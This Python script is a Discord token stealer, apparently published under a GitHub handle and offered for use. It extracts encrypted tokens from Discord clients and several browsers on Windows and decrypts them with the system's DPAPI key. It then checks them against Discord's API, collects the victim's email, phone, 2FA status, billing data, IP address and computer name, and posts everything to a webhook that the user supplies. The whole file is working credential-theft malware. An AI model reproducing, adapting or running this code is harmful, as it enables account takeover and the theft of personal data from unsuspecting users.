from base64 import b64decode
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
from os import getenv, listdir
from json import loads, dumps
from re import findall
from urllib.request import Request, urlopen
from subprocess import Popen, PIPE
import requests
import os
from datetime import datetime

tokens, cleaned, checker = [], [], []

def decrypt(buff, master_key):
    try:
        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
    except Exception:
        return "Error"

def get_ip():
    try:
        return urlopen(Request("https://api.ipify.org")).read().decode().strip()
    except Exception:
        return "None"

def get_hwid():
    p = Popen("wmic csproduct get uuid", shell=True, stdin=PIPE, stdout=PIPE, stderr=PIPE)
    return (p.stdout.read() + p.stderr.read()).decode().split("\n")[1].strip()

def get_local_state_key(path):
    try:
        with open(path, "r", errors="ignore") as file:
            local_state = loads(file.read())
        return b64decode(local_state['os_crypt']['encrypted_key'])[5:]
    except Exception:
        return None

def extract_tokens_from_path(path, key):
    tokens = []
    for file_name in listdir(path + "\\Local Storage\\leveldb\\"):
        if not file_name.endswith((".ldb", ".log")):
            continue
        with open(f"{path}\\Local Storage\\leveldb\\{file_name}", "r", errors='ignore') as file:
            for line in file.readlines():
                for token in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line.strip()):
                    tokens.append(decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), key))
    return tokens

def gather_tokens():
    local = getenv('LOCALAPPDATA')
    roaming = getenv('APPDATA')
    chrome = local + "\\Google\\Chrome\\User Data"
    paths = {
        'Discord': roaming + '\\discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Lightcord': roaming + '\\Lightcord',
        'Discord PTB': roaming + '\\discordptb',
        'Opera': roaming + '\\Opera Software\\Opera Stable',
        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
        'Chrome': chrome + 'Default',
        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        key = get_local_state_key(path + "\\Local State")
        if not key:
            continue

        tokens.extend(extract_tokens_from_path(path, key))
    return tokens

def send_to_webhook(embed_content, webhook_url):
    payload = dumps({
        'content': embed_content,
        'username': 'Token Grabber - Made by aselterik',
        'avatar_url': 'https://cdn2.thecatapi.com/images/2f1.jpg'
    })
    headers = {'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0'}

    try:
        req = Request(webhook_url, data=payload.encode(), headers=headers)
        urlopen(req)
    except Exception as e:
        print(f"Failed to send to webhook: {e}")

def main():
    tokens = gather_tokens()
    if not tokens:
        return

    already_checked_tokens = []
    ip = get_ip()
    pc_username = getenv("UserName")
    pc_name = getenv("COMPUTERNAME")

    for token in tokens:
        if token in already_checked_tokens or token == "Error":
            continue

        already_checked_tokens.append(token)
        headers = {'Authorization': token, 'Content-Type': 'application/json'}

        try:
            res = requests.get('https://discordapp.com/api/v6/users/@me', headers=headers)
        except Exception:
            continue

        if res.status_code != 200:
            continue

        res_json = res.json()
        user_name = f'{res_json["username"]}#{res_json["discriminator"]}'
        user_id = res_json['id']
        email = res_json.get('email', 'N/A')
        phone = res_json.get('phone', 'N/A')
        mfa_enabled = res_json.get('mfa_enabled', False)
        
        has_nitro = False
        days_left = 0
        try:
            nitro_data = requests.get('https://discordapp.com/api/v6/users/@me/billing/subscriptions', headers=headers).json()
            has_nitro = bool(len(nitro_data) > 0)
            if has_nitro:
                d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
                days_left = abs((d2 - d1).days)
        except:
            pass

        embed_content = f"""\n\n\n**{user_name}** *({user_id})*\n
> :dividers: __Account Information__\n\tEmail: `{email}`\n\tPhone: `{phone}`\n\t2FA/MFA Enabled: `{mfa_enabled}`\n\tNitro: `{has_nitro}`\n\tExpires in: `{days_left if days_left else "None"} day(s)`\n
> :computer: __PC Information__\n\tIP: `{ip}`\n\tUsername: `{pc_username}`\n\tPC Name: `{pc_name}`\n
> :joy: __Token__\n\t{token}\n
*Made by aselterik* **|** https://github.com/aselterik """

        send_to_webhook(embed_content, 'WEBHOOK_HERE')  # Replace with your webhook URL

if __name__ == '__main__':
    main()
